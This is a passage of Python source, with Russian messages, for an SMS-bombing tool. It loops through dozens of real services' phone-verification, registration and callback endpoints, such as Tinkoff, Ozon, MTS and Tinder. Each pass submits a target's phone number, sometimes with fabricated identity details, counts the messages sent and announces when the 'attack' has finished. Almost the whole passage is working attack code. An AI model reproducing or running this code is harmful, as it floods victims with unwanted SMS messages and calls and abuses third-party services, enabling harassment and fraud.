            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            time.sleep(1)
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            R = R + 1
            print('[+] RuTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            R = R + 1
            print('[+] BelkaCar Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php',
                          data={'aj': '50', 'registration-phone': _phone})
            R = R + 1
            print('[+] StarPizzaCafe Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            R = R + 1
            print('[+] Dostavista Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:

            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] MonoBank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
            R = R + 1
            print('[+] binotel Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                         data={"phone": _phone})
            R = R + 1
            print('[+] SportMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            R = R + 1
            print('[+] Alfalife Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            R = R + 1
            print('[+] KoronaPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone',
                          data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                                "oferta": "on", })
            R = R + 1
            print('[+] GGbet Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.etm.ru/cat/runprog.html',
                          data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                                "getSysParam": "yes", })
            R = R + 1
            print('[+] ETM Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
            R = R + 1
            print('[+] TheLive Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            R = R + 1
            print('[+] MyGames Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/',
                          json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                                "birthdate": "11.11.1999", "phone": (_phone, "+* (***) ***-**-**"), "email": _email,
                                "city": "Москва", })
            R = R + 1
            print('[+] Zoloto585 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            R = R + 1
            print('[+] Kasta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            R = R + 1
            print('[+] Тaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send',
                          json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
            R = R + 1
            print('[+] Creditter Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                          headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                          json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                                "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999),
                                "DocSeries": randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                                "SecondName": _name, "Phone": _phone, "Email": _email, })
            R = R + 1
            print('[+] Ingos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                          json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                                "email": "", "lang": "en", })
            R = R + 1
            print('[+] Admiralxxx Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            R = R + 1
            print('[+] Av Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            R = R + 1
            print('[+] City24 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            R = R + 1
            print('[+] SushiMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            R = R + 1
            print('[+] MultiPlex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
            R = R + 1
            print('[+] 3040 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                          data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
            R = R + 1
            print('[+] Niyama Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            R = R + 1
            print('[+] VSK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            R = R + 1
            print('[+] EasyPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            R = R + 1
            print('[+] Fix-Price Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            R = R + 1
            print('[+] Tele2 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] Finam Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://makimaki.ru/system/callback.php',
                          params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
            R = R + 1
            print('[+] MakiMaki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status',
                          headers={"Origin": "https://www.flipkart.com",
                                   "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                          json={"loginId": "+" + _phone, "supportAllStates": True})
            R = R + 1
            print('[+] FlipKart Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            R = R + 1
            print('[+] Online.ua Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            R = R + 1
            print('[+] PlanetaKino Was sent!')
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client',
                          json={"country": _codes[_code].upper(), "phone": _phone, })
            R = R + 1
            print('[+] OnTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Iqos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/',
                          json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            R = R + 1
            print('[+] Smart.Space Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                          data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                                'phone': _phone})
            R = R + 1
            print('[+] tarantino-family Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://apteka.ru/_action/auth/getForm/',
                          data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                "utc_offset": "120", })
            R = R + 1
            print('[+] Apteka Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            R = R + 1
            print('[+] Uklon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            R = R + 1
            print('[+] Ozon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
